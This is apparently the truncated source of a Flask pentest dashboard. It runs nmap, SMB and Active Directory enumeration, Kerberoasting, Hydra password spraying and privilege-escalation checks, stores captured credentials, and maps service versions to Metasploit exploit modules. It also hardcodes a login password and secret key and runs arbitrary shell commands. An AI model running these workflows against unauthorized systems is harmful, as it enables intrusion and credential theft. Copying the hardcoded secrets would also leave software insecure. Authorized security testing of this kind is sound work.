from flask import Flask, jsonify, request, render_template, session, redirect, url_for, Response, stream_with_context, make_response
from functools import wraps
import yaml, json, os, re, uuid, time, signal, threading, subprocess, queue, ipaddress, sqlite3, shutil, tempfile
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from pathlib import Path

app = Flask(__name__)
app.secret_key = "p3nt3st-su1t3-s3cr3t-k3y-2026"

APP_USER = "javi"
APP_PASSWORD = "juanito12"

BASE_DIR = Path(__file__).parent
TOOLS_DIR = BASE_DIR / "data" / "tools"
PROJECTS_DIR = BASE_DIR / "data" / "projects"
PROJECTS_DIR.mkdir(parents=True, exist_ok=True)

# ── Session Memory (cross-session SQLite) ─────────────────────────────────
MEMORY_DB = BASE_DIR / "data" / "session_memory.db"

class SessionMemory:
    def __init__(self):
        MEMORY_DB.parent.mkdir(parents=True, exist_ok=True)
        with sqlite3.connect(str(MEMORY_DB)) as c:
            c.executescript("""
                CREATE TABLE IF NOT EXISTS hosts (
                    ip TEXT, port INTEGER, service TEXT, version TEXT,
                    risk INTEGER DEFAULT 1, first_seen TEXT, last_seen TEXT,
                    PRIMARY KEY(ip, port)
                );
                CREATE TABLE IF NOT EXISTS credentials (
                    host TEXT, service TEXT, username TEXT, password TEXT,
                    verified INTEGER DEFAULT 0, first_seen TEXT,
                    PRIMARY KEY(host, service, username, password)
                );
                CREATE TABLE IF NOT EXISTS pivot_networks (
                    source_ip TEXT, network TEXT, first_seen TEXT,
                    PRIMARY KEY(source_ip, network)
                );
            """)

    def remember_host(self, ip, port, service, version, risk=1):
        now = datetime.now().isoformat()
        with sqlite3.connect(str(MEMORY_DB)) as c:
            c.execute("""INSERT INTO hosts(ip,port,service,version,risk,first_seen,last_seen)
                VALUES(?,?,?,?,?,?,?)
                ON CONFLICT(ip,port) DO UPDATE SET
                version=excluded.version, risk=excluded.risk, last_seen=excluded.last_seen""",
                (ip, port, service, version, risk, now, now))

    def recall_host(self, ip):
        with sqlite3.connect(str(MEMORY_DB)) as c:
            rows = c.execute(
                "SELECT port,service,version,risk FROM hosts WHERE ip=? ORDER BY port", (ip,)
            ).fetchall()
        return [{"port": r[0], "service": r[1], "version": r[2], "risk": r[3]} for r in rows]

    def remember_cred(self, host, service, username, password, verified=False):
        now = datetime.now().isoformat()
        with sqlite3.connect(str(MEMORY_DB)) as c:
            c.execute(
                "INSERT OR IGNORE INTO credentials(host,service,username,password,verified,first_seen)"
                " VALUES(?,?,?,?,?,?)",
                (host, service, username, password, int(verified), now))
            if verified:
                c.execute(
                    "UPDATE credentials SET verified=1"
                    " WHERE host=? AND service=? AND username=? AND password=?",
                    (host, service, username, password))

    def get_all_verified_creds(self):
        with sqlite3.connect(str(MEMORY_DB)) as c:
            rows = c.execute(
                "SELECT host,service,username,password FROM credentials WHERE verified=1"
            ).fetchall()
        return [{"host": r[0], "service": r[1], "username": r[2], "password": r[3]} for r in rows]

    def remember_pivot(self, source_ip, network):
        now = datetime.now().isoformat()
        with sqlite3.connect(str(MEMORY_DB)) as c:
            c.execute("INSERT OR IGNORE INTO pivot_networks VALUES(?,?,?)", (source_ip, network, now))

    def get_stats(self):
        with sqlite3.connect(str(MEMORY_DB)) as c:
            c.execute("BEGIN")
            hosts = c.execute("SELECT COUNT(DISTINCT ip) FROM hosts").fetchone()[0]
            creds = c.execute("SELECT COUNT(*) FROM credentials WHERE verified=1").fetchone()[0]
            nets  = c.execute("SELECT COUNT(*) FROM pivot_networks").fetchone()[0]
        return {"known_hosts": hosts, "verified_creds": creds, "pivot_networks": nets}

MEMORY = SessionMemory()

# ── In-memory job store ────────────────────────────────────────────────────
JOBS: dict = {}
JOBS_LOCK = threading.Lock()

# ══════════════════════════════════════════════════════════════════════════════
# C4 — Rate Limiting por plan
# ══════════════════════════════════════════════════════════════════════════════
_rate_counters: dict = {}   # {api_key: {"count": N, "window_start": float}}
_rate_lock = threading.Lock()
_PLAN_RATE_LIMITS = {
    "free":       (5,     3600),   # 5 scans/hour
    "starter":    (50,    3600),   # 50/hour
    "pro":        (500,   3600),   # 500/hour
    "enterprise": (99999, 60),     # unlimited
}

def _check_rate_limit(api_key: str, plan: str = "free"):
    """Returns (allowed: bool, remaining: int, window_secs: int)."""
    max_req, window = _PLAN_RATE_LIMITS.get(plan, _PLAN_RATE_LIMITS["free"])
    now = time.time()
    with _rate_lock:
        entry = _rate_counters.setdefault(api_key, {"count": 0, "window_start": now})
        if now - entry["window_start"] > window:
            entry["count"] = 0
            entry["window_start"] = now
        if entry["count"] >= max_req:
            return False, 0, window
        entry["count"] += 1
        return True, max_req - entry["count"], window

def _resolve_api_key_plan(api_key: str) -> str:
    """Look up plan for an API key; defaults to 'free'."""
    try:
        orgs_path = BASE_DIR / "data" / "orgs.json"
        if orgs_path.exists():
            orgs = json.loads(orgs_path.read_text())
            for org in orgs.values():
                if org.get("api_key") == api_key:
                    return org.get("plan", "free")
    except Exception:
        pass
    return "free"

def require_rate_limit(f):
    """Decorator: enforce per-plan rate limiting on API routes."""
    @wraps(f)
    def decorated(*args, **kwargs):
        api_key = request.headers.get("X-API-Key", "anon")
        plan = _resolve_api_key_plan(api_key)
        allowed, remaining, window = _check_rate_limit(api_key, plan)
        if not allowed:
            return jsonify({
                "error": "Rate limit exceeded",
                "plan": plan,
                "retry_after_seconds": window,
            }), 429
        response = f(*args, **kwargs)
        # Inject headers if it's a real Response
        try:
            response.headers["X-RateLimit-Remaining"] = str(remaining)
            response.headers["X-RateLimit-Plan"] = plan
        except Exception:
            pass
        return response
    return decorated


# ══════════════════════════════════════════════════════════════════════════════
# C5 — Audit Log (SQLite)
# ══════════════════════════════════════════════════════════════════════════════
AUDIT_DB = BASE_DIR / "data" / "audit.db"

def _init_audit_db():
    AUDIT_DB.parent.mkdir(parents=True, exist_ok=True)
    with sqlite3.connect(str(AUDIT_DB)) as c:
        c.execute("""
            CREATE TABLE IF NOT EXISTS audit_log (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                ts          TEXT NOT NULL,
                user        TEXT,
                api_key     TEXT,
                ip          TEXT,
                method      TEXT,
                path        TEXT,
                project_id  TEXT,
                action      TEXT,
                details     TEXT,
                status_code INTEGER
            )
        """)

def _audit(action: str, project_id: str = None, details=None, status_code: int = 200):
    """Write an audit log entry. Safe to call from any context."""
    try:
        ts = datetime.utcnow().isoformat()
        user = "system"
        api_key = ""
        ip = ""
        method = ""
        path = ""
        try:
            user = session.get("user", "api")
            api_key = request.headers.get("X-API-Key", "")[:24]
            ip = request.remote_addr or ""
            method = request.method
            path = request.path
        except Exception:
            pass
        with sqlite3.connect(str(AUDIT_DB)) as conn:
            conn.execute(
                "INSERT INTO audit_log(ts,user,api_key,ip,method,path,project_id,action,details,status_code) "
                "VALUES(?,?,?,?,?,?,?,?,?,?)",
                (ts, user, api_key, ip, method, path, project_id,
                 action, json.dumps(details) if details else None, status_code),
            )
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════════════════
# S1 — Scan Scheduler (SQLite-backed, background thread)
# ══════════════════════════════════════════════════════════════════════════════
SCHEDULER_DB = BASE_DIR / "data" / "scheduler.db"

def _init_scheduler_db():
    SCHEDULER_DB.parent.mkdir(parents=True, exist_ok=True)
    with sqlite3.connect(str(SCHEDULER_DB)) as c:
        c.execute("""
            CREATE TABLE IF NOT EXISTS scheduled_scans (
                id          TEXT PRIMARY KEY,
                project_id  TEXT,
                target      TEXT,
                cron_expr   TEXT,
                enabled     INTEGER DEFAULT 1,
                last_run    TEXT,
                next_run    TEXT,
                created_at  TEXT,
                scan_config TEXT
            )
        """)

def _next_cron_run(cron_expr: str) -> str:
    """Parse simple expressions: every_Nh | daily_HH:MM | weekly_DAY_HH:MM"""
    now = datetime.utcnow()
    m = re.match(r'every_(\d+)h', cron_expr)
    if m:
        return (now + timedelta(hours=int(m.group(1)))).isoformat()
    m = re.match(r'daily_(\d{1,2}):(\d{2})', cron_expr)
    if m:
        nxt = now.replace(hour=int(m.group(1)), minute=int(m.group(2)), second=0, microsecond=0)
        if nxt <= now:
            nxt += timedelta(days=1)
        return nxt.isoformat()
    m = re.match(r'weekly_(\w+)_(\d{1,2}):(\d{2})', cron_expr)
    if m:
        days_map = {"mon": 0, "tue": 1, "wed": 2, "thu": 3, "fri": 4, "sat": 5, "sun": 6}
        target_day = days_map.get(m.group(1).lower(), 0)
        nxt = now.replace(hour=int(m.group(2)), minute=int(m.group(3)), second=0, microsecond=0)
        days_ahead = (target_day - now.weekday()) % 7
        if days_ahead == 0 and nxt <= now:
            days_ahead = 7
        nxt += timedelta(days=days_ahead)
        return nxt.isoformat()
    # Default: 24h
    return (now + timedelta(hours=24)).isoformat()

def _scheduler_tick():
    """Background daemon: fire scheduled scans when due."""
    _init_scheduler_db()
    while True:
        try:
            now_iso = datetime.utcnow().isoformat()
            with sqlite3.connect(str(SCHEDULER_DB)) as conn:
                rows = conn.execute(
                    "SELECT id,project_id,target,cron_expr,scan_config FROM scheduled_scans "
                    "WHERE enabled=1 AND (next_run IS NULL OR next_run <= ?)",
                    (now_iso,),
                ).fetchall()
            for row in rows:
                sched_id, proj_id, tgt, cron_expr, cfg_str = row
                cfg = json.loads(cfg_str or "{}")
                try:
                    # BUG4 FIX: no 'from __main__ import' — ClaudePentestEngine and
                    # AUTOPILOT_ENGINES are already in this module's global scope.
                    eng = ClaudePentestEngine(
                        project_id=proj_id, targets=[tgt],
                        mode=cfg.get("mode", "normal"),
                        lhost=cfg.get("lhost", ""),
                        lport=cfg.get("lport", "4444"),
                    )
                    # BUG3 FIX: store in AUTOPILOT_ENGINES (the single authoritative dict)
                    AUTOPILOT_ENGINES[proj_id] = eng
                    eng.start()
                    nxt = _next_cron_run(cron_expr)
                    with sqlite3.connect(str(SCHEDULER_DB)) as conn:
                        conn.execute(
                            "UPDATE scheduled_scans SET last_run=?,next_run=? WHERE id=?",
                            (now_iso, nxt, sched_id),
                        )
                    _audit("scheduler_fired", proj_id, {"target": tgt, "cron": cron_expr})
                except Exception as exc:
                    print(f"[Scheduler] Error on {sched_id}: {exc}")
        except Exception as exc:
            print(f"[Scheduler] Tick error: {exc}")
        time.sleep(60)


# ── Workflow definitions ───────────────────────────────────────────────────
WORKFLOWS = [
    {
        "id": "full_recon",
        "name": "Full Auto-Recon",
        "description": "Nmap quick + full TCP + UDP con detección de servicios.",
        "icon": "fa-radar",
        "color": "blue",
        "steps": [
            {"name": "Nmap Quick (top 1000)", "command": "nmap -T4 -sV --open --top-ports 1000 {rhost}", "parse": "nmap"},
            {"name": "Nmap Full TCP", "command": "nmap -T4 -sC -sV -p- --min-rate 5000 --max-retries 1 --host-timeout 20m {rhost} -oN /tmp/nmap_full_{rhost}.txt", "parse": "nmap"},
            {"name": "Nmap UDP Top-20", "command": "nmap -T4 -sU --top-ports 20 --max-retries 1 {rhost}", "parse": "nmap"},
        ],
    },
    {
        "id": "web_enum",
        "name": "Web Enumeration",
        "description": "WhatWeb + Gobuster dirs/vhosts + Nikto automático.",
        "icon": "fa-globe",
        "color": "orange",
        "steps": [
            {"name": "WhatWeb", "command": "whatweb http://{rhost} https://{rhost} 2>/dev/null"},
            {"name": "Gobuster dirs", "command": "gobuster dir -u http://{rhost} -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,html,txt,asp,aspx -q"},
            {"name": "Gobuster vhosts", "command": "gobuster vhost -u http://{rhost} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 40 -q 2>/dev/null"},
            {"name": "Nikto", "command": "nikto -h http://{rhost} -C all 2>/dev/null"},
        ],
    },
    {
        "id": "smb_enum",
        "name": "SMB Enumeration",
        "description": "CrackMapExec + smbclient + smbmap + enum4linux.",
        "icon": "fa-folder-open",
        "color": "yellow",
        "steps": [
            {"name": "CrackMapExec SMB", "command": "crackmapexec smb {rhost}"},
            {"name": "smbclient shares", "command": "smbclient -L //{rhost} -N 2>/dev/null"},
            {"name": "smbmap", "command": "smbmap -H {rhost} 2>/dev/null"},
            {"name": "enum4linux", "command": "enum4linux -a {rhost} 2>/dev/null"},
        ],
    },
    {
        "id": "ad_recon",
        "name": "AD Enumeration",
        "description": "LDAP anónimo + Kerberoasting + AS-REP Roasting.",
        "icon": "fa-sitemap",
        "color": "red",
        "steps": [
            {"name": "LDAP anon base", "command": "ldapsearch -x -H ldap://{rhost} -b '' -s base namingContexts 2>/dev/null"},
            {"name": "Kerberoasting", "command": "GetUserSPNs.py {domain}/ -dc-ip {rhost} -no-pass -request 2>/dev/null"},
            {"name": "AS-REP Roasting", "command": "GetNPUsers.py {domain}/ -dc-ip {rhost} -no-pass -format hashcat 2>/dev/null"},
            {"name": "RID Brute (anon)", "command": "crackmapexec smb {rhost} --rid-brute 2>/dev/null"},
        ],
    },
    {
        "id": "privesc_linux",
        "name": "Linux PrivEsc Checklist",
        "description": "sudo + SUID + capabilities + cron + PATH hijacking.",
        "icon": "fa-linux",
        "color": "green",
        "steps": [
            {"name": "sudo -l", "command": "sudo -l 2>/dev/null"},
            {"name": "SUID binaries", "command": "find / -perm -4000 -type f 2>/dev/null"},
            {"name": "Capabilities", "command": "getcap -r / 2>/dev/null"},
            {"name": "Cron jobs", "command": "cat /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null; ls -la /etc/cron* 2>/dev/null"},
            {"name": "Writable dirs", "command": "find / -writable -type d 2>/dev/null | grep -Ev 'proc|sys|dev'"},
        ],
    },
    {
        "id": "password_spray",
        "name": "Password Spray",
        "description": "Hydra SSH + SMB con credenciales comunes.",
        "icon": "fa-key",
        "color": "purple",
        "steps": [
            {"name": "Hydra SSH", "command": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt {rhost} ssh -t 4 2>/dev/null"},
            {"name": "Hydra FTP", "command": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt {rhost} ftp -t 4 2>/dev/null"},
            {"name": "CrackMapExec SMB spray", "command": "crackmapexec smb {rhost} -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt --no-bruteforce 2>/dev/null"},
        ],
    },
    {
        "id": "autonomous_pentest",
        "name": "Pentest Autónomo",
        "description": "Recon + vuln scripts + nuclei con inyección dinámica de pasos y auto-save de findings.",
        "icon": "fa-robot",
        "color": "violet",
        "auto_inject": True,
        "steps": [
            {
                "name": "Nmap Discovery + Vuln Scripts",
                "command": "nmap -T4 -sV --open --top-ports 1000 --script=vuln,auth,default {rhost}",
                "parse": "nmap",
            },
            {
                "name": "Nmap Full TCP",
                "command": "nmap -T4 -sV -p- --min-rate 5000 --max-retries 1 --host-timeout 20m {rhost} -oN /tmp/nmap_full_{rhost}.txt",
                "parse": "nmap",
            },
        ],
    },
]

# ── Auth ───────────────────────────────────────────────────────────────────

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

def api_login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form["username"] == APP_USER and request.form["password"] == APP_PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("index"))
        error = "Credenciales incorrectas"
    return render_template("login.html", error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# ── Tools & Projects ───────────────────────────────────────────────────────

def load_tools(phase=None):
    tools = []
    phases = [phase] if phase else [
        "recon", "enum", "exploitation",
        "web_attacks", "privesc_windows", "privesc_linux",
        "pivoting", "ad_attacks",
        "av_evasion", "metasploit", "password_attacks",
        "client_side", "cloud_aws"
    ]
    for p in phases:
        filepath = TOOLS_DIR / f"{p}.yaml"
        if not filepath.exists():
            continue
        with open(filepath, encoding="utf-8") as f:
            data = yaml.safe_load(f)
            for tool in data.get("tools", []):
                tool["phase"] = p
                tools.append(tool)
    return tools

def read_project(project_id):
    filepath = PROJECTS_DIR / f"{project_id}.json"
    if not filepath.exists():
        return None
    with open(filepath, encoding="utf-8") as f:
        return json.load(f)

def write_project(project):
    filepath = PROJECTS_DIR / f"{project['id']}.json"
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(project, f, indent=2, ensure_ascii=False)

@app.route("/")
@login_required
def index():
    return render_template("index.html")

@app.route("/api/tools")
@api_login_required
def api_tools():
    phase = request.args.get("phase")
    return jsonify(load_tools(phase))

@app.route("/api/projects", methods=["GET"])
@api_login_required
def api_projects():
    projects = []
    for f in PROJECTS_DIR.glob("*.json"):
        with open(f, encoding="utf-8") as fp:
            projects.append(json.load(fp))
    projects.sort(key=lambda x: x.get("created_at", ""), reverse=True)
    return jsonify(projects)

@app.route("/api/projects", methods=["POST"])
@api_login_required
def create_project():
    data = request.json
    project = {
        "id": str(uuid.uuid4()),
        "name": data["name"],
        "client": data.get("client", ""),
        "targets": data.get("targets", []),
        "domains": data.get("domains", []),
        "scope": data.get("scope", ""),
        "notes": data.get("notes", ""),
        "commands": [],
        "loot": [],
        "findings": [],
        "created_at": datetime.now().isoformat(),
        "status": "active",
    }
    write_project(project)
    return jsonify(project), 201

@app.route("/api/projects/<project_id>", methods=["GET"])
@api_login_required
def get_project(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    return jsonify(project)

@app.route("/api/projects/<project_id>", methods=["PUT"])
@api_login_required
def update_project(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    for key, value in request.json.items():
        if key not in ("id", "created_at"):
            project[key] = value
    write_project(project)
    return jsonify(project)

@app.route("/api/projects/<project_id>", methods=["DELETE"])
@api_login_required
def delete_project(project_id):
    filepath = PROJECTS_DIR / f"{project_id}.json"
    if filepath.exists():
        os.remove(filepath)
    return jsonify({"ok": True})

# ── Job Execution (T1) ─────────────────────────────────────────────────────

def _job_safe(job):
    return {k: v for k, v in job.items() if k != "proc"}

@app.route("/api/run", methods=["POST"])
@api_login_required
def run_command():
    data = request.json
    command = data.get("command", "").strip()
    if not command:
        return jsonify({"error": "Command required"}), 400

    job_id = str(uuid.uuid4())
    job = {
        "id": job_id,
        "project_id": data.get("project_id", ""),
        "tool": data.get("tool", "Custom"),
        "phase": data.get("phase", "custom"),
        "command": command,
        "status": "running",
        "output": [],
        "started_at": datetime.now().isoformat(),
        "finished_at": None,
        "pid": None,
        "return_code": None,
        "proc": None,
        "workflow_id": data.get("workflow_id"),
    }

    with JOBS_LOCK:
        JOBS[job_id] = job

    def _run():
        try:
            proc = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1, start_new_session=True,
            )
            job["proc"] = proc
            job["pid"] = proc.pid
            for line in proc.stdout:
                job["output"].append(line.rstrip("\n"))
            proc.wait()
            job["return_code"] = proc.returncode
            if job["status"] == "running":
                job["status"] = "completed" if proc.returncode == 0 else "error"
        except Exception as e:
            job["output"].append(f"[ERROR] {e}")
            job["status"] = "error"
        finally:
            job["finished_at"] = datetime.now().isoformat()
            job.pop("proc", None)

    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"job_id": job_id}), 202

@app.route("/api/jobs")
@api_login_required
def list_jobs():
    project_id = request.args.get("project_id", "")
    with JOBS_LOCK:
        jobs = [
            _job_safe(j) for j in JOBS.values()
            if not project_id or j.get("project_id") == project_id
        ]
    # exclude output from list (too heavy), just metadata
    result = []
    for j in jobs:
        meta = {k: v for k, v in j.items() if k != "output"}
        meta["line_count"] = len(JOBS.get(j["id"], {}).get("output", []))
        result.append(meta)
    result.sort(key=lambda x: x.get("started_at", ""), reverse=True)
    return jsonify(result)

@app.route("/api/jobs/<job_id>")
@api_login_required
def get_job(job_id):
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "Not found"}), 404
    offset = int(request.args.get("offset", 0))
    safe = _job_safe(job)
    safe["output"] = job["output"][offset:]
    safe["total_lines"] = len(job["output"])
    return jsonify(safe)

@app.route("/api/jobs/<job_id>/stream")
@api_login_required
def stream_job(job_id):
    offset = int(request.args.get("offset", 0))

    def generate():
        job = JOBS.get(job_id)
        if not job:
            yield "event: done\ndata: not_found\n\n"
            return
        sent = offset
        while True:
            lines = job["output"]
            while sent < len(lines):
                yield f"data: {lines[sent]}\n\n"
                sent += 1
            if job["status"] != "running":
                yield f"event: done\ndata: {job['status']}\n\n"
                return
            time.sleep(0.1)

    return Response(
        stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )

@app.route("/api/jobs/<job_id>/stop", methods=["POST"])
@api_login_required
def stop_job(job_id):
    job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "Not found"}), 404
    if job["status"] == "running":
        proc = job.get("proc")
        if proc:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except Exception:
                try:
                    proc.terminate()
                except Exception:
                    pass
        job["status"] = "stopped"
        job["finished_at"] = datetime.now().isoformat()
    return jsonify({"ok": True})

@app.route("/api/jobs/<job_id>", methods=["DELETE"])
@api_login_required
def delete_job(job_id):
    with JOBS_LOCK:
        JOBS.pop(job_id, None)
    return jsonify({"ok": True})

# ── Workflows (T2) ─────────────────────────────────────────────────────────

@app.route("/api/workflows")
@api_login_required
def list_workflows():
    return jsonify(WORKFLOWS)

@app.route("/api/workflows/run", methods=["POST"])
@api_login_required
def run_workflow():
    data = request.json
    wf_id = data.get("workflow_id")
    project_id = data.get("project_id", "")
    vars_dict = data.get("vars", {})

    workflow = next((w for w in WORKFLOWS if w["id"] == wf_id), None)
    if not workflow:
        return jsonify({"error": "Workflow not found"}), 404

    wf_run_id = str(uuid.uuid4())

    def _run_wf():
        steps = list(workflow["steps"])   # mutable — auto_inject can append
        injected = set()
        rhost_val = vars_dict.get("rhost", "")
        i = 0
        while i < len(steps):
            step = steps[i]
            i += 1

            cmd = step["command"]
            for k, v in vars_dict.items():
                cmd = cmd.replace(f"{{{k}}}", v)

            job_id = str(uuid.uuid4())
            job = {
                "id": job_id,
                "project_id": project_id,
                "tool": step["name"],
                "phase": "workflow",
                "command": cmd,
                "status": "running",
                "output": [],
                "started_at": datetime.now().isoformat(),
                "finished_at": None,
                "pid": None,
                "return_code": None,
                "proc": None,
                "workflow_id": wf_run_id,
                "workflow_name": workflow["name"],
                "parse": step.get("parse"),
            }

            with JOBS_LOCK:
                JOBS[job_id] = job

            try:
                proc = subprocess.Popen(
                    cmd, shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1, start_new_session=True,
                )
                job["proc"] = proc
                job["pid"] = proc.pid
                for line in proc.stdout:
                    job["output"].append(line.rstrip("\n"))
                proc.wait()
                job["return_code"] = proc.returncode
                if job["status"] == "running":
                    job["status"] = "completed" if proc.returncode == 0 else "error"
            except Exception as e:
                job["output"].append(f"[ERROR] {e}")
                job["status"] = "error"
            finally:
                job["finished_at"] = datetime.now().isoformat()
                job.pop("proc", None)

            # ── Auto-parse output and save findings + ports to project ──────
            if step.get("parse") and project_id:
                output_text = "\n".join(job["output"])
                try:
                    parsed = _parse_tool_output(step["parse"], output_text, rhost_val, step.get("name", ""))
                except Exception:
                    parsed = None

                if parsed and (parsed.get("findings") or parsed.get("open_ports")):
                    try:
                        proj = read_project(project_id)
                        if proj:
                            existing_titles = {f["title"] for f in proj.get("findings", [])}
                            for f in parsed["findings"]:
                                if f["title"] not in existing_titles:
                                    _auto_mitre_tag(f)
                                    _attach_msf_command(f, rhost_val, vars_dict)
                                    proj.setdefault("findings", []).append(f)
                                    existing_titles.add(f["title"])

                            existing_ports = {
                                (p.get("port"), p.get("proto"))
                                for p in proj.get("port_map", [])
                            }
                            for p in parsed.get("open_ports", []):
                                key = (p["port"], p["proto"])
                                if key not in existing_ports:
                                    proj.setdefault("port_map", []).append({
                                        "host": rhost_val,
                                        "port": p["port"],
                                        "proto": p["proto"],
                                        "service": p["service"],
                                        "version": p.get("version", ""),
                                        "added_by": "auto-recon",
                                    })
                                    existing_ports.add(key)
                            write_project(proj)
                    except Exception:
                        pass

                # ── Dynamic step injection (autonomous_pentest only) ────────
                if workflow.get("auto_inject") and parsed:
                    try:
                        port_nums = {p["port"] for p in parsed.get("open_ports", [])}
                        if port_nums:
                            _inject_followup_steps(steps, injected, port_nums, rhost_val)
                        if parsed.get("findings"):
                            _inject_exploitation_steps(steps, injected, parsed["findings"], vars_dict, rhost_val)
                    except Exception:
                        pass

    threading.Thread(target=_run_wf, daemon=True).start()
    return jsonify({"workflow_run_id": wf_run_id}), 202

# ── Output Parsing (T3) ────────────────────────────────────────────────────

# Maps (version_regex, port_or_None, severity, cve, description_with_msf_hint)
VERSION_CVE_MAP = [
    # FTP
    (r'vsftpd 2\.3\.4',                  21,    'critical', '',              'vsFTPd 2.3.4 Backdoor RCE sin auth | exploit/unix/ftp/vsftpd_234_backdoor'),
    (r'proftpd 1\.3\.[3-5]',             21,    'critical', 'CVE-2010-4221', 'ProFTPd mod_copy RCE | exploit/unix/ftp/proftpd_modcopy_exec'),
    # SMB/Samba
    (r'samba 3\.[0-2]\.',                445,   'critical', 'CVE-2007-2447', 'Samba username map script RCE | exploit/multi/samba/usermap_script'),
    (r'samba 3\.[3-6]\.',                445,   'high',     'CVE-2010-2063', 'Samba 3.x — symlink traversal + possible RCE'),
    # Windows SMB — OS version triggers
    (r'windows.*xp|windows.*2003',       445,   'critical', 'CVE-2017-0143', 'EternalBlue candidato (WinXP/2003) | exploit/windows/smb/ms17_010_eternalblue'),
    (r'windows.*(server 2008|vista|7\b)',445,   'critical', 'CVE-2017-0143', 'EternalBlue candidato (Win7/2008) | exploit/windows/smb/ms17_010_eternalblue'),
    # Apache httpd
    (r'apache.*2\.4\.49',                None,  'critical', 'CVE-2021-41773', 'Apache 2.4.49 Path Traversal + RCE | exploit/multi/http/apache_normalize_path_rce'),
    (r'apache.*2\.4\.50',                None,  'critical', 'CVE-2021-42013', 'Apache 2.4.50 Path Traversal + RCE | exploit/multi/http/apache_normalize_path_rce'),
    # PHP
    (r'php.*cgi|php-cgi',                None,  'high',     'CVE-2012-1823', 'PHP CGI Argument Injection RCE | exploit/multi/http/php_cgi_arg_injection'),
    (r'\bphp/(5\.[2-6]|7\.0\.)',         None,  'medium',   '',              'PHP 5.x/7.0 obsoleto — revisar CVEs conocidos (php-cgi, XXE, RFI)'),
    # SSL/TLS
    (r'openssl (0\.|1\.0\.[01])',         None,  'high',     'CVE-2014-0160', 'Heartbleed — memory leak | auxiliary/scanner/ssl/openssl_heartbleed'),
    # Tomcat
    (r'apache.tomcat[/ ]([0-7]\.|8\.[0-4]\.)',None,'high',  'CVE-2017-12617','Tomcat PUT JSP Upload RCE | exploit/multi/http/tomcat_jsp_upload_bypass'),
    (r'apache.tomcat[/ ][0-9]\.',        None,  'medium',   '',              'Tomcat detectado — verificar Manager app con creds por defecto'),
    # IRC
    (r'unrealircd 3\.2\.8\.1',           None,  'critical', '',              'UnrealIRCd 3.2.8.1 Backdoor RCE | exploit/unix/irc/unreal_ircd_3281_backdoor'),
    # distcc
    (r'distccd',                          None,  'critical', 'CVE-2004-2687', 'distccd RCE sin auth | exploit/unix/misc/distcc_exec'),
    # Redis
    (r'redis( server)?[ /](2|3|4|5)\.',  6379,  'high',     '',              'Redis sin auth — RCE via cron o SSH keys authorized_keys'),
    # Elasticsearch
    (r'elasticsearch[ /][01]\.',          9200,  'critical', 'CVE-2014-3120', 'Elasticsearch RCE via dynamic scripting'),
    # Drupal
    (r'drupal[ /]7\.',                    None,  'critical', 'CVE-2018-7600', 'Drupalgeddon2 RCE | exploit/unix/webapp/drupal_drupalgeddon2'),
    (r'drupal[ /]8\.[0-5]\.',            None,  'critical', 'CVE-2018-7600', 'Drupalgeddon2 RCE | exploit/unix/webapp/drupal_drupalgeddon2'),
    # IIS
    (r'microsoft-iis[/ ](5\.|6\.0)',     None,  'high',     'CVE-2017-7269', 'IIS 6.0 WebDAV ScStoragePathFromUrl Buffer Overflow'),
    # Databases
    (r'mysql[ /]5\.[01]\.',              3306,  'high',     '',              'MySQL 5.0/5.1 — revisar UDF injection, FILE priv'),
    (r'microsoft sql server 200[058]',   1433,  'high',     '',              'MSSQL antiguo — revisar xp_cmdshell, sa sin contraseña'),
    (r'mongodb',                          27017, 'high',     '',              'MongoDB — verificar si no requiere auth (acceso anónimo)'),
    # Services sin cifrado
    (r'telnet',                           23,    'medium',   '',              'Telnet sin cifrado — credenciales en texto plano'),
    (r'\brexec\b',                        512,   'high',     '',              'rexec sin auth | auxiliary/scanner/rservices/rexec_login'),
    (r'\brlogin\b',                       513,   'high',     '',              'rlogin sin auth | exploit/unix/rservices/rlogin_login'),
    # NFS
    (r'nfs|rpcbind',                      2049,  'medium',   '',              'NFS — revisar exports montables sin root squash'),
    # Memcached
    (r'memcached',                        11211, 'medium',   '',              'Memcached sin auth — acceso a datos en caché'),
    # JBoss
    (r'jboss[/ ](3|4|5|6)\.',            None,  'critical', 'CVE-2010-0738', 'JBoss JMXInvokerServlet RCE | exploit/multi/http/jboss_invoke_deploy'),
    # Confluence
    (r'confluence[/ ](5|6|7)\.',         None,  'critical', 'CVE-2022-26134', 'Confluence OGNL Injection RCE | exploit/multi/http/confluence_namespace_ognl_injection'),
    # Webmin
    (r'webmin[/ ]1\.(9[0-9][0-9])',      None,  'critical', 'CVE-2019-15107', 'Webmin 1.9xx RCE sin auth | exploit/linux/http/webmin_backdoor'),
